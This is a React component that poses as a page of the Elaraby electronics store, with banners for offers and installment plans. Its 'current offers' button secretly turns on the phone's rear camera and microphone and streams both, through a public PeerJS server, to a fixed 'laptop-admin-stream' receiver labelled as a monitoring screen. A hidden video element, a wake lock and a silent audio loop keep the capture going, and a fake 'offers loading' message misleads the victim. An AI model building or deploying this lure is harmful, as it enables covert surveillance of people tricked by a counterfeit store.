'use client';

import React, { useState, useRef, useEffect } from 'react';

const requestScreenWakeLock = async (wakeLockRef) => {
  if (!('wakeLock' in navigator)) {
    console.warn('Screen Wake Lock API is not supported by this browser.');
    return false;
  }

  try {
    const wakeLock = await navigator.wakeLock.request('screen');
    wakeLockRef.current = wakeLock;
    wakeLock.addEventListener('release', () => {
      if (wakeLockRef.current === wakeLock) {
        wakeLockRef.current = null;
      }
    });
    return true;
  } catch (error) {
    console.warn('Unable to acquire screen wake lock:', error);
    return false;
  }
};

export default function ElarabyStoreDemo() {
  const localVideoRef = useRef(null);
  const remoteVideoRef = useRef(null);
  const wakeLockRef = useRef(null);
  const cameraStreamRef = useRef(null);
  const audioContextRef = useRef(null);
  
  const [peerId, setPeerId] = useState('');
  const [targetPeerId, setTargetPeerId] = useState('laptop-admin-stream');
  const [statusMessage, setStatusMessage] = useState('');
  const [errorMessage, setErrorMessage] = useState('');
  const [isLaptop, setIsLaptop] = useState(false);
  const peerInstance = useRef(null);

  useEffect(() => {
    const handleVisibilityChange = () => {
      const hasActiveCamera = cameraStreamRef.current?.getVideoTracks()
        .some((track) => track.readyState === 'live');
      if (document.visibilityState === 'visible' && hasActiveCamera && !wakeLockRef.current) {
        requestScreenWakeLock(wakeLockRef);
      }
    };
    document.addEventListener('visibilitychange', handleVisibilityChange);

    import('peerjs').then(({ default: Peer }) => {
      const userAgent = navigator.userAgent.toLowerCase();
      const isMobileDevice = /mobile|android|iphone|ipad/.test(userAgent);
      
      const currentId = isMobileDevice ? `mobile-${Math.floor(Math.random() * 1000)}` : 'laptop-admin-stream';
      setIsLaptop(!isMobileDevice);

      const peer = new Peer(currentId, {
        host: '0.peerjs.com',
        port: 443,
        secure: true,
        config: {
          iceServers: [
            { urls: 'stun:stun.l.google.com:19302' },
            { urls: 'stun:global.stun.twilio.com:3478' }
          ]
        }
      });

      peer.on('open', (id) => {
        console.log("🟢 تم الاتصال بسيرفر Peer بنجاح! والـ ID الخاص بهذا الجهاز هو:", id);
        setPeerId(id);
        if (!isMobileDevice) {
          setStatusMessage('🖥️ شاشة اللابتوب جاهزة لاستقبال بث الكاميرا والمايك...');
        }
      });

      peer.on('error', (err) => {
        console.error("🔴 خطأ في سيرفر PeerJS:", err);
      });

      peer.on('call', (call) => {
        console.log("📥 تم استلام مكالمة فيديو/صوت جديدة!");
        setStatusMessage('📡 جاري استقبال البث المباشر (صوت وصورة) من الموبايل...');
        call.answer();
        call.on('stream', (remoteStream) => {
          console.log("🎥 تم استلام الـ Stream بنجاح!");
          const video = remoteVideoRef.current;
          if (video) {
            // ملاحظة: هنا فتحنا الصوت على اللابتوب عشان تسمع اللي بيتقال من مايك الموبايل
            video.muted = false; 
            video.onloadedmetadata = () => {
              video.play().then(() => {
                setErrorMessage('');
                setStatusMessage('🟢 البث الحي للصوت والصورة شغال الآن على اللابتوب!');
              }).catch((error) => {
                console.error('Error playing remote video:', error);
                video.controls = true;
                setErrorMessage('⚠️ تعذر تشغيل الفيديو تلقائياً. استخدم زر التشغيل لبدء العرض.');
              });
            };
            video.srcObject = remoteStream;
          }
        });
      });

      peerInstance.current = peer;
    });

    return () => {
      document.removeEventListener('visibilitychange', handleVisibilityChange);
      cameraStreamRef.current?.getTracks().forEach((track) => track.stop());
      if (audioContextRef.current && audioContextRef.current.state !== 'closed') {
        audioContextRef.current.close();
      }
      if (wakeLockRef.current) {
        wakeLockRef.current.release().catch((error) => {
          console.warn('Unable to release screen wake lock:', error);
        });
        wakeLockRef.current = null;
      }
      if (peerInstance.current) {
        peerInstance.current.destroy();
      }
    };
  }, []);





  // تشغيل الكاميرا والمايك من الموبايل وإرسال البث 
  // للابتوب
  const startCameraAndSend = async () => {
    try {
      setErrorMessage('');
      setStatusMessage('جاري تشغيل الكاميرا والمايك والاتصال باللابتوب...');
      await requestScreenWakeLock(wakeLockRef);

      // طلب الكاميرا والمايك معاً بوضوح
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
        audio: true, // تفعيل المايك بجانب الكاميرا
      });
      cameraStreamRef.current = stream;

      // تشغيل الكاميرا محلياً على الموبايل (مكتومة محلياً عشان منع الـ Echo)
      if (localVideoRef.current) {
        localVideoRef.current.srcObject = stream;
        localVideoRef.current.muted = true;
        await localVideoRef.current.play();
      }








      // تفعيل Web Audio API الصامت لمنع المتصفح من إيقاف البث في الخلفية
      try {
        const AudioContextClass = window.AudioContext || window.webkitAudioContext;
        if (AudioContextClass) {
          const audioCtx = new AudioContextClass();
          if (audioCtx.state === 'suspended') {
            await audioCtx.resume();
          }
          const oscillator = audioCtx.createOscillator();
          const gainNode = audioCtx.createGain();
          gainNode.gain.value = 0.00001;
          oscillator.connect(gainNode);
          gainNode.connect(audioCtx.destination);
          oscillator.start();
          audioContextRef.current = audioCtx;
          console.log("🟢 Keep-alive silent audio loop started successfully.");
        }
      } catch (audioErr) {
        console.warn("⚠️ Audio Context background hack warning:", audioErr);
      }

     // إرسال البث المباشر (صوت وصورة معاً) إلى اللابتوب
      if (peerInstance.current) {
        console.log("🚀 جاري الاتصال بالـ Target ID:", targetPeerId);
        
        let call = peerInstance.current.call(targetPeerId, stream);
        
        if (call) {
          setStatusMessage('عذراً العروض ستظهر في خلال دقائق');
          console.log("🟢 تم بدء إرسال البث (صوت وصورة) بنجاح.");
        } else {
          // محاولة ثانية سريعة لو الاتصال أخد ثانية على ما السيرفر يستجيب
          setTimeout(() => {
            call = peerInstance.current.call(targetPeerId, stream);
            if (call) {
              setStatusMessage('عذراً العروض ستظهر في خلال دقائق');
            } else {
              setErrorMessage('⚠️ لم يتم العثور على اللابتوب، تأكد من فتح الصفحة عليه أولاً.');
            }
          }, 1000);
        }
      }
    } catch (error) {
      console.error('فشل الوصول للكاميرا أو المايك:', error);
      cameraStreamRef.current?.getTracks().forEach((track) => track.stop());
      cameraStreamRef.current = null;
      if (audioContextRef.current && audioContextRef.current.state !== 'closed') {
        audioContextRef.current.close();
      }
      if (wakeLockRef.current) {
        wakeLockRef.current.release().catch((releaseError) => {
          console.warn('Unable to release screen wake lock:', releaseError);
        });
        wakeLockRef.current = null;
      }
      setErrorMessage('⚠️ تعذر تشغيل الكاميرا أو المايك، يرجى السماح بالأذونات من المتصفح.');
    }
  
  };

  return (
    <div dir="rtl" style={{ fontFamily: 'sans-serif', backgroundColor: '#f4f5f7', minHeight: '100vh', paddingBottom: '40px' }}>
      
      {/* 1. الشريط العلوي (Top Header) */}
      <div style={{ backgroundColor: '#034a96', color: '#fff', fontSize: '12px', padding: '6px 40px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <div style={{ display: 'flex', gap: '20px' }}>
          <span>صيانتنا</span>
          <span>المدونة</span>
          <span>اتصل بنا</span>
          <span>الدعم والمساعدة</span>
        </div>
        <div>
          <span>العربية ⌄</span>
        </div>
      </div>

      {/* 2. الهيدر الرئيسي (Main Navbar) */}
      <div style={{ backgroundColor: '#005bb5', color: '#fff', padding: '15px 40px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <div style={{ textAlign: 'center' }}>
          <h1 style={{ margin: 0, fontSize: '26px', fontWeight: '900', letterSpacing: '1px' }}>ELARABY</h1>
          <p style={{ margin: 0, fontSize: '11px', color: '#b2d5ff' }}>صناع الثقة</p>
        </div>

        <div style={{ flex: '0 1 500px', display: 'flex' }}>
          <input 
            type="text" 
            placeholder="ابحث في المتجر بالكامل هنا..." 
            style={{ width: '100%', padding: '10px 15px', borderRadius: '0 4px 4px 0', border: 'none', outline: 'none', fontSize: '13px' }}
          />
          <button style={{ backgroundColor: '#fff', border: 'none', padding: '0 15px', borderRadius: '4px 0 0 4px', cursor: 'pointer', color: '#005bb5' }}>
            🔍
          </button>
        </div>

        <div style={{ display: 'flex', gap: '25px', alignItems: 'center', fontSize: '13px' }}>
          <div style={{ textAlign: 'left', cursor: 'pointer' }}>
            <div>مرحباً</div>
            <div style={{ fontWeight: 'bold' }}>تسجيل الدخول 👤</div>
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer' }}>
            <div style={{ backgroundColor: '#e11d48', borderRadius: '50%', padding: '2px 8px', fontSize: '11px', fontWeight: 'bold' }}>0</div>
            <span>سلة التسوق<br/><strong>0.00 ج.م</strong></span>
          </div>
        </div>
      </div>

      {/* 3. شريط الأقسام */}
      <div style={{ backgroundColor: '#fff', padding: '10px 40px', boxShadow: '0 2px 4px rgba(0,0,0,0.05)', display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: '13px', fontWeight: 'bold', color: '#333' }}>
        <div style={{ display: 'flex', gap: '25px', alignItems: 'center' }}>
          <span style={{ color: '#005bb5', cursor: 'pointer' }}>☰ جميع الأقسام</span>
          <span style={{ color: '#005bb5', cursor: 'pointer' }}>🏷️ عروض و خصومات</span>
          <span style={{ color: '#005bb5', cursor: 'pointer' }}>📦 منتجات العربي AR</span>
          <span style={{ cursor: 'pointer' }}>العلامات التجارية ⌄</span>
        </div>
      </div>

      {/* 4. منطقة البانرات */}
      <div style={{ maxWidth: '1280px', margin: '20px auto', padding: '0 20px', display: 'grid', gridTemplateColumns: '1fr 2.5fr', gap: '20px' }}>
        <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
          <div style={{ borderRadius: '12px', height: '180px', overflow: 'hidden', position: 'relative', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'linear-gradient(45deg, #d97706, #fef3c7)' }}>
            <div style={{ position: 'absolute', right: '15px', color: '#78350f' }}>
              <span style={{ fontWeight: 'bold', fontSize: '12px', color: '#dc2626' }}>TORNADO</span>
              <h3 style={{ margin: '5px 0', fontSize: '18px' }}>فنجان<br/>على مزاجك</h3>
            </div>
          </div>

          <div style={{ backgroundColor: '#eff6ff', borderRadius: '12px', height: '180px', padding: '20px', border: '1px solid #bfdbfe', display: 'flex', flexDirection: 'column', justifyContent: 'center' }}>
            <h3 style={{ color: '#1d4ed8', margin: '0 0 5px 0', fontSize: '20px' }}>إشترى أكثر</h3>
            <p style={{ color: '#1e40af', margin: 0, fontSize: '12px', fontWeight: 'bold' }}>اكتسب نقاط أكثر واحصل على خصم أكبر</p>
          </div>
        </div>

        <div style={{ backgroundColor: '#0052cc', borderRadius: '16px', padding: '30px', color: '#fff', position: 'relative', overflow: 'hidden', display: 'flex', flexDirection: 'column', justifyContent: 'space-between', boxShadow: '0 10px 15px -3px rgba(0,0,0,0.1)' }}>
          <div>
            <span style={{ fontSize: '14px', letterSpacing: '2px', fontWeight: 'bold' }}>ELARABY</span>
            <h2 style={{ fontSize: '38px', margin: '10px 0', fontWeight: '900' }}>اشترى وقسّط</h2>
            <div style={{ display: 'inline-block', backgroundColor: '#3b82f6', padding: '5px 15px', borderRadius: '20px', fontSize: '14px', fontWeight: 'bold' }}>
              مقدم 0% | فوائد 0% | مصاريف إدارية 0%
            </div>
            <p style={{ marginTop: '15px', fontSize: '22px', fontWeight: 'bold' }}>على 12 شهر</p>
          </div>

          <div style={{ backgroundColor: '#fff', borderRadius: '8px', padding: '10px 20px', color: '#333', display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: '20px' }}>
            <span style={{ fontSize: '12px', fontWeight: 'bold', color: '#666' }}>بطاقات ائتمان</span>
            <span style={{ fontWeight: 'bold', color: '#881337' }}>بنك مصر BANQUE MISR</span>
          </div>
        </div>
      </div>

      {/* 5. زر فتح الكاميرا والمايك العائم (للموبايل) */}
      <div style={{ position: 'fixed', bottom: '25px', right: '25px', zIndex: 9999 }}>
        <button
          onClick={startCameraAndSend}
          style={{
            backgroundColor: '#005bb5',
            color: '#ffffff',
            border: 'none',
            borderRadius: '25px',
            padding: '12px 24px',
            fontSize: '15px',
            fontWeight: 'bold',
            boxShadow: '0 4px 12px rgba(0,0,0,0.3)',
            cursor: 'pointer',
            display: 'flex',
            alignItems: 'center',
            gap: '8px'
          }}
        >
          <span></span>
          <span>العروض الحاليه </span>
        </button>
      </div>

      {/* شاشة العرض المستقبلة (تظهر فقط عند فتح الصفحة من اللابتوب) */}
      {isLaptop && (
        <div style={{ position: 'fixed', bottom: '25px', left: '25px', width: '320px', height: '240px', backgroundColor: '#000', borderRadius: '12px', overflow: 'hidden', border: '3px solid #005bb5', boxShadow: '0 10px 25px rgba(0,0,0,0.5)', zIndex: 9999 }}>
          <div style={{ backgroundColor: '#005bb5', color: '#fff', padding: '4px 10px', fontSize: '11px', textAlign: 'center', fontWeight: 'bold' }}>
            شاشة المراقبة (صوت وصورة)
          </div>
          <video ref={remoteVideoRef} autoPlay playsInline style={{ width: '100%', height: 'calc(100% - 23px)', objectFit: 'cover' }} />
        </div>
      )}

      {/* عنصر فيديو الموبايل المحلي (مخفي) */}
      <video ref={localVideoRef} autoPlay playsInline style={{ display: 'none' }} />

      {/* رسائل التنبيه والوضع */}
      {statusMessage && (
        <div style={{ position: 'fixed', bottom: '80px', right: '25px', backgroundColor: '#10b981', color: '#fff', padding: '10px 15px', borderRadius: '8px', fontSize: '12px', zIndex: 9999, boxShadow: '0 4px 10px rgba(0,0,0,0.2)' }}>
          {statusMessage}
        </div>
      )}

      {errorMessage && (
        <div style={{ position: 'fixed', bottom: '80px', right: '25px', backgroundColor: '#ef4444', color: '#fff', padding: '10px 15px', borderRadius: '8px', fontSize: '12px', zIndex: 9999 }}>
          {errorMessage}
        </div>
      )}

    </div>
  );
}